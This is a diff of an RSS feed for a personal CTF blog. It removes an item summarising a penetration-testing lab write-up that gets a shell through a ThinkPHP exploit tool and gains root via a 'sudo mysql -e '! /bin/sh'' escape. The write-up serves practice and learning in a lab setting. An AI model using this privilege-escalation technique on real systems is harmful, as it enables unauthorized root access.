@@ -1,28 +1,9 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>All Posts - ThnPinkman’s blog</title>
-        <link>https://thnpkm.github.io/posts/</link>
-        <description>All Posts | ThnPinkman’s blog</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/posts/" rel="self" type="application/rss+xml" /><item>
-    <title>春秋云镜 Initial</title>
-    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</link>
-    <pubDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</pubDate>
-    <author>Author</author>
-    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</guid>
-    <description><![CDATA[春秋云镜 Initial 外网打点 站点图标很好判断是TP的站
-拿TP漏洞利用工具试一下
-getshell
-一般的目录下没有flag，即继续看能不能提权
-提权 首先尝试能不能suid提权
-感觉没有好利用的
-查看linux的信息 这种流程走一遍
-uname -a 查看系统全部信息 # Linux ubuntu-web01 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxuname -r 查看内核版本 # 5.4.0-110-generic 可以用kali的自带工具searchsploit 找对应版本的提权，无果
-继续可以看 sudo
-sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /usr/bin/mysql https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg上面的文章提到 以上结果列出了mysql，就可以使用 sudo mysql -e &lsquo;! /bin/sh&rsquo; 获得一个特权shell，或者 sudo -u root mysql -e &lsquo;! /bin/sh&rsquo;
-这种格式可以执行root权限命令，来找一下flag
-sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
-</item>
-<item>
+        <title>CTF - Category - ThnPinkman’s blog</title>
+        <link>https://thnpkm.github.io/categories/ctf/</link>
+        <description>CTF - Category - ThnPinkman’s blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/categories/ctf/" rel="self" type="application/rss+xml" /><item>
     <title>2020羊城杯</title>
     <link>https://thnpkm.github.io/posts/ctf/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020/</link>
     <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
